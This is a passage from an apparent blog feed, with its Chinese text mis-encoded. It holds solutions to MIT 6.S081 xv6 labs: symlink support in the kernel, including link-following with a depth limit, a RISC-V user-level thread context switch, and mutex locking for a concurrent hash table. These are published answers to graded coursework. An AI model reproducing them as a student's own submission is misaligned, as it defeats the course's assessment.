·çš„â€œè·Ÿéšâ€è¿‡ç¨‹å°±å¯èƒ½ä¼šå¯¼è‡´æ­»å¾ªç¯ï¼Œå› æ­¤å¿…é¡»åŠ ä»¥é™åˆ¶ï¼Œè¿™é‡Œä¸ºäº†å®ç°çš„æ–¹ä¾¿ï¼Œåªæ˜¯è®¾å®šäº†ä¸€ä¸ªæœ€å¤§é€’å½’æ·±åº¦ï¼Œå½“é€’å½’æ·±åº¦è¶…è¿‡è¯¥è®¾å®šæœ€å¤§å€¼æ—¶ï¼Œæ–‡ä»¶æ‰“å¼€å°±ä¼šå¤±è´¥ã€‚</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>omode <span class="token operator">&amp;</span> O_NOFOLLOW<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> depth <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span>     <span class="token comment">// max recursive depth</span>    <span class="token keyword">struct</span> <span class="token class-name">inode</span> <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// next inode</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>depth <span class="token operator">></span> <span class="token number">0</span> <span class="token operator">&amp;&amp;</span> ip<span class="token operator">-></span>type <span class="token operator">==</span> T_SYMLINK<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// read data from file that ip points to to path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">readi</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>uint64<span class="token punctuation">)</span>path<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MAXPATH<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token comment">// get inode of file in the path</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>next <span class="token operator">=</span> <span class="token function">namei</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        ip <span class="token operator">=</span> next<span class="token punctuation">;</span>        <span class="token operator">--</span>depth<span class="token punctuation">;</span>        <span class="token function">ilock</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>depth <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">iunlockput</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">end_op</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><h2 id="ä»£ç -1"><a href="#ä»£ç -1" class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..37a202c 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_symlinktest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/fcntl.h b/kernel/fcntl.hindex 44861b9..b42df18 100644<span class="token coord">--- a/kernel/fcntl.h</span><span class="token coord">+++ b/kernel/fcntl.h</span><span class="token coord">@@ -3,3 +3,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define O_RDWR    0x002</span><span class="token prefix unchanged"> </span><span class="token line">#define O_CREATE  0x200</span><span class="token prefix unchanged"> </span><span class="token line">#define O_TRUNC   0x400</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define O_NOFOLLOW 0x800</span></span>\ No newline at end of filediff --git a/kernel/stat.h b/kernel/stat.hindex 19543af..46ba47f 100644<span class="token coord">--- a/kernel/stat.h</span><span class="token coord">+++ b/kernel/stat.h</span><span class="token coord">@@ -1,6 +1,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define T_DIR     1   // Directory</span><span class="token prefix unchanged"> </span><span class="token line">#define T_FILE    2   // File</span><span class="token prefix unchanged"> </span><span class="token line">#define T_DEVICE  3   // Device</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define T_SYMLINK 4   // Symbol link</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct stat &#123;</span><span class="token prefix unchanged"> </span><span class="token line">  int dev;     // File system's disk device</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..1697b62 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,7 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_symlink(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +128,7 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_symlink] sys_symlink,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..0fbf6ed 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,4 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_symlink 22</span></span>\ No newline at end of filediff --git a/kernel/sysfile.c b/kernel/sysfile.cindex 5dc453b..ae342c8 100644<span class="token coord">--- a/kernel/sysfile.c</span><span class="token coord">+++ b/kernel/sysfile.c</span><span class="token coord">@@ -15,6 +15,7 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#include "sleeplock.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "file.h"</span><span class="token prefix unchanged"> </span><span class="token line">#include "fcntl.h"</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#include "buf.h"</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// Fetch the nth word-sized system call argument as a file descriptor</span><span class="token prefix unchanged"> </span><span class="token line">// and return both the descriptor and the corresponding struct file.</span></span>@@ -316,6 +317,35 @@ sys_open(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if (!(omode &amp; O_NOFOLLOW)) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    int depth = 10;</span><span class="token prefix inserted">+</span><span class="token line">    struct inode *next;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    while (depth > 0 &amp;&amp; ip->type == T_SYMLINK) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      if (readi(ip, 0, (uint64)path, 0, MAXPATH) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">      if ((next = namei(path)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">        iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">        end_op();</span><span class="token prefix inserted">+</span><span class="token line">        return -1;</span><span class="token prefix inserted">+</span><span class="token line">      &#125;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      ip = next;</span><span class="token prefix inserted">+</span><span class="token line">      --depth;</span><span class="token prefix inserted">+</span><span class="token line">      ilock(ip);</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">    if (depth &lt;= 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">      iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">      end_op();</span><span class="token prefix inserted">+</span><span class="token line">      return -1;</span><span class="token prefix inserted">+</span><span class="token line">    &#125;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  if(ip->type == T_DEVICE &amp;&amp; (ip->major &lt; 0 || ip->major >= NDEV))&#123;</span><span class="token prefix unchanged"> </span><span class="token line">    iunlockput(ip);</span><span class="token prefix unchanged"> </span><span class="token line">    end_op();</span></span>@@ -484,3 +514,28 @@ sys_pipe(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_symlink(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  int n1, n2;</span><span class="token prefix inserted">+</span><span class="token line">  char target[MAXPATH], path[MAXPATH];</span><span class="token prefix inserted">+</span><span class="token line">  struct inode *ip;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  if ((n1 = argstr(0, target, MAXPATH)) &lt; 0 || (n2 = argstr(1, path, MAXPATH)) &lt; 1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  </span><span class="token prefix inserted">+</span><span class="token line">  // create symbol link in the path</span><span class="token prefix inserted">+</span><span class="token line">  begin_op();</span><span class="token prefix inserted">+</span><span class="token line">  if ((ip = create(path, T_SYMLINK, 0, 0)) == 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  if (writei(ip, 0, (uint64)target, 0, n1) &lt; n1) &#123;</span><span class="token prefix inserted">+</span><span class="token line">    end_op();</span><span class="token prefix inserted">+</span><span class="token line">    return -1;</span><span class="token prefix inserted">+</span><span class="token line">  &#125;</span><span class="token prefix inserted">+</span><span class="token line">  iunlockput(ip);</span><span class="token prefix inserted">+</span><span class="token line">  end_op();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>\ No newline at end of filediff --git a/user/user.h b/user/user.hindex b71ecda..883ef48 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,7 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int symlink(char *, char *);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..65a8d6b 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,4 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("symlink");</span></span>\ No newline at end of file</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Large-files&quot;&gt;&lt;a href=&quot;#Large-files&quot; class=&quot;headerlink&quot; title=&quot;Large files&quot;&gt;&lt;/a&gt;Large files&lt;/h1&gt;&lt;h2 id=&quot;æ€è·¯&quot;&gt;&lt;a href=&quot;#æ€è·¯&quot; class=&quot;head</summary>
      
    
    
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="ç»éªŒ" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="æ“ä½œç³»ç»Ÿ" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Multithreading</title>
    <link href="http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/"/>
    <id>http://lordaeronesz.github.io/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/</id>
    <published>2024-08-13T10:03:11.000Z</published>
    <updated>2024-08-14T08:16:25.833Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Uthread-switching-between-threads"><a href="#Uthread-switching-between-threads" class="headerlink" title="Uthread: switching between threads"></a>Uthread: switching between threads</h1><h2 id="æ€è·¯"><a href="#æ€è·¯" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>xv6 å·²ç»å®ç°äº†è¿›ç¨‹çš„åˆ‡æ¢æœºåˆ¶ï¼Œæœ¬å®éªŒè¦æ±‚å‚è€ƒè¿›ç¨‹çš„åˆ‡æ¢ï¼Œå®ç°ä¸€ä¸ªç”¨æˆ·æ€çº¿ç¨‹çš„åˆ‡æ¢ã€‚</p><p>è¦å®ç°çº¿ç¨‹åˆ‡æ¢ï¼Œå¿…ç„¶æ¶‰åŠä¸Šä¸‹æ–‡ï¼Œå³å¯„å­˜å™¨çš„ä¿å­˜å’Œæ¢å¤ï¼Œé‚£ä¹ˆéœ€è¦ä¿å­˜å“ªäº›å¯„å­˜å™¨ï¼Ÿå®é™…ä¸Šï¼Œåªéœ€è¦ä¿å­˜è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨ï¼ˆcallee-saved registersï¼‰ï¼Œè€Œå®ç°è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨ï¼ˆcaller-saved registersï¼‰çš„ä¿å­˜ä¸æ¢å¤çš„ä»£ç ç”±ç¼–è¯‘å™¨è‡ªåŠ¨ç”Ÿæˆã€‚å…³äºè°ƒç”¨è€…ä¿å­˜ä¸è¢«è°ƒç”¨è€…ä¿å­˜å¯„å­˜å™¨æœ‰å“ªäº›å¯ä»¥å‚ç…§ä¸‹è¿° RISC-V çš„ calling conventionï¼š</p><p><img src="/2024/08/13/MIT6.s081-2021-Lab%20Multithreading/call.png"></p><p>å¦å¤–ï¼Œæ ¹æ® <code>user/uthread_switch.S</code> çš„æ³¨é‡Šï¼Œ<code>thread_switch</code> æœ€åé€šè¿‡ <code>ret</code> æŒ‡ä»¤å°†å½“å‰ç¨‹åºè®¡æ•°å™¨çš„å€¼åˆ‡æ¢ä¸º ra å¯„å­˜å™¨ä¸­å­˜å‚¨çš„åœ°å€ï¼Œå®ç°è¿›ç¨‹çš„â€œåˆ‡æ¢â€ï¼Œå› æ­¤ <code>struct thread</code> ä¸­è¿˜éœ€è¦ä¿å­˜æ¯ä¸ªçº¿ç¨‹å¯¹åº”ç¨‹åºçš„èµ·å§‹åœ°å€ï¼ˆå³å‡½æ•°æŒ‡é’ˆï¼‰ã€‚</p><p>åœ¨äº†è§£éœ€è¦ä¿å­˜å“ªäº›å¯„å­˜å™¨ä¹‹åä»¥åŠå¦‚ä½•è¿›è¡Œçº¿ç¨‹åˆ‡æ¢ä¹‹åï¼Œè¿˜æœ‰ä¸€ä¸ªç»†èŠ‚éœ€è¦è€ƒè™‘ï¼Œå³æ ˆæŒ‡é’ˆå¯„å­˜å™¨ï¼ˆspï¼‰çš„åˆå§‹åŒ–ã€‚çº¿ç¨‹æ ˆçš„å­˜å‚¨ä½ç½®ä¸º <code>struct thread</code> ä¸­çš„ <code>stack</code> æ•°ç»„ï¼Œé‚£ä¹ˆ sp åº”è¯¥æŒ‡å‘ <code>stack</code> çš„ä½ç½®ï¼Œä½†ç”±äºæ ˆçš„åœ°å€ä»å¤§åˆ°å°å¢é•¿ï¼Œå› æ­¤ <code>sp</code> åº”è¯¥åˆå§‹åŒ–ä¸º <code>(uint64)t-&gt;stack + STACK_SIZE</code>.</p><h2 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/user/uthread.c b/user/uthread.cindex 06349f5..74b7f20 100644<span class="token coord">--- a/user/uthread.c</span><span class="token coord">+++ b/user/uthread.c</span><span class="token coord">@@ -12,6 +12,20 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">struct thread &#123;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  /* 0 */  uint64 ra;</span><span class="token prefix inserted">+</span><span class="token line">  /* 8 */  uint64 sp;</span><span class="token prefix inserted">+</span><span class="token line">  /* 16 */  uint64 s0;</span><span class="token prefix inserted">+</span><span class="token line">  /* 24 */ uint64 s1;</span><span class="token prefix inserted">+</span><span class="token line">  /* 32 */ uint64 s2;</span><span class="token prefix inserted">+</span><span class="token line">  /* 40 */ uint64 s3;</span><span class="token prefix inserted">+</span><span class="token line">  /* 48 */ uint64 s4;</span><span class="token prefix inserted">+</span><span class="token line">  /* 56 */ uint64 s5;</span><span class="token prefix inserted">+</span><span class="token line">  /* 64 */ uint64 s6;</span><span class="token prefix inserted">+</span><span class="token line">  /* 72 */ uint64 s7;</span><span class="token prefix inserted">+</span><span class="token line">  /* 80 */ uint64 s8;</span><span class="token prefix inserted">+</span><span class="token line">  /* 88 */ uint64 s9;</span><span class="token prefix inserted">+</span><span class="token line">  /* 96 */ uint64 s10;</span><span class="token prefix inserted">+</span><span class="token line">  /* 104 */ uint64 s11;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  char       stack[STACK_SIZE]; /* the thread's stack */</span><span class="token prefix unchanged"> </span><span class="token line">  int        state;             /* FREE, RUNNING, RUNNABLE */</span><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>@@ -62,6 +76,7 @@ thread_schedule(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">     * Invoke thread_switch to switch from t to next_thread:</span><span class="token prefix unchanged"> </span><span class="token line">     * thread_switch(??, ??);</span><span class="token prefix unchanged"> </span><span class="token line">     */</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">thread_switch((uint64)t, (uint64)current_thread);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125; else</span><span class="token prefix unchanged"> </span><span class="token line">    next_thread = 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>@@ -76,6 +91,8 @@ thread_create(void (*func)())<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  t->state = RUNNABLE;</span><span class="token prefix unchanged"> </span><span class="token line">  // YOUR CODE HERE</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  t->ra = (uint64)func;</span><span class="token prefix inserted">+</span><span class="token line">  t->sp = (uint64)t->stack + STACK_SIZE;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void </span></span>diff --git a/user/uthread_switch.S b/user/uthread_switch.Sindex 5defb12..0eb0a2c 100644<span class="token coord">--- a/user/uthread_switch.S</span><span class="token coord">+++ b/user/uthread_switch.S</span><span class="token coord">@@ -7,5 +7,34 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">.globl thread_switch</span><span class="token prefix unchanged"> </span><span class="token line">thread_switch:</span></span>/* YOUR CODE HERE */<span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">sd ra, 0(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd sp, 8(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s0, 16(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s1, 24(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s2, 32(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s3, 40(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s4, 48(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s5, 56(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s6, 64(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s7, 72(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s8, 80(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s9, 88(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s10, 96(a0)</span><span class="token prefix inserted">+</span><span class="token line">sd s11, 104(a0)</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">ld ra, 0(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld sp, 8(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s0, 16(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s1, 24(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s2, 32(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s3, 40(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s4, 48(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s5, 56(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s6, 64(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s7, 72(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s8, 80(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s9, 88(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s10, 96(a1)</span><span class="token prefix inserted">+</span><span class="token line">ld s11, 104(a1)</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">ret    /* return to ra */</span></span></code></pre><h1 id="Using-threads"><a href="#Using-threads" class="headerlink" title="Using threads"></a>Using threads</h1><h2 id="æ€è·¯-1"><a href="#æ€è·¯-1" class="headerlink" title="æ€è·¯"></a>æ€è·¯</h2><p>åä¸¤ä¸ªå®éªŒä¸ xv6 æ— å…³ï¼Œè€Œæ˜¯ç»ƒä¹ ä½¿ç”¨ POSIX çº¿ç¨‹åº“åœ¨å®é™…çš„ Linux å¹³å°è¿›è¡Œå¹¶å‘ç¼–ç¨‹ã€‚</p><p>æœ¬å®éªŒè¦æ±‚ä½¿ç”¨é”æœºåˆ¶ï¼Œå®ç°ä¸€ä¸ªæ”¯æŒå¹¶å‘çš„å“ˆå¸Œè¡¨ã€‚é¦–å…ˆéœ€è¦ç¡®å®šçš„æ˜¯ï¼šå“ªéƒ¨åˆ†çš„æ“ä½œä¼šå‡ºç°ç«æ€ï¼ˆrace conditionï¼‰ï¼Ÿæ ¹æ®è§‚å¯Ÿä¸éš¾å¾—çŸ¥ <code>put()</code> æ“ä½œå¯èƒ½å­˜åœ¨ä¸‹é¢è¿™ç§æƒ…å†µï¼š</p><blockquote><p>çº¿ç¨‹ 1 å’Œçº¿ç¨‹ 2 æœ¬æ¬¡ <code>put()</code> æ˜ å°„åˆ°ä¸€ä¸ªæ¡¶ä¸­ï¼ˆi ç›¸åŒï¼‰ï¼Œéƒ½æ‰§è¡Œå®Œ line 46 ~ 49 çš„å¾ªç¯ä¹‹åï¼Œe éƒ½ä¸º 0ï¼Œéšåå…ˆåæ‰§è¡Œ <code>insert()</code>ï¼Œéƒ½åˆ›å»ºä¸€ä¸ªæ–°çš„ entryï¼Œå¹¶å…ˆåæ›´æ–° <code>table[i]</code> çš„å€¼ï¼Œå¯¼è‡´å…ˆæ’å…¥çš„é”®è¢«è¦†ç›–ã€‚<br>åƒè¿™æ ·ï¼Œåœ¨ä¸€æ¬¡æ’å…¥æ“ä½œæœªå®Œæˆçš„æƒ…å†µä¸‹ï¼Œå¦ä¸€æ¬¡æ’å…¥ä¹Ÿå¼€å§‹è¿›è¡Œä¸”æ˜ å°„åˆ°ä¸€ä¸ªæ¡¶ä¸­ï¼Œå°±ä¼šå¯¼è‡´ä¸¢é”®ï¼ˆkeys missingï¼‰çš„æƒ…å†µå‘ç”Ÿã€‚</p></blockquote><p>é¦–å…ˆæœ€ç®€å•æ— è„‘çš„åŠæ³•å°±æ˜¯ç»™æ•´ä¸ª <code>put()</code> å‡½æ•°åŠ ä¸€æŠŠå¤§é”ï¼š</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">pthread_mutex_lock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// lock</span><span class="token keyword">for</span> <span class="token punctuation">(</span>e <span class="token operator">=</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span> e <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span> e <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>key <span class="token operator">==</span> key<span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// update the existing key.</span>    e<span class="token operator">-></span>value <span class="token operator">=</span> value<span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// the new is new.</span>    <span class="token function">insert</span><span class="token punctuation">(</span>key<span class="token punctuation">,</span> value<span class="token punctuation">,</span> <span class="token operator">&amp;</span>table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> table<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">pthread_mutex_unlock</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">;</span> 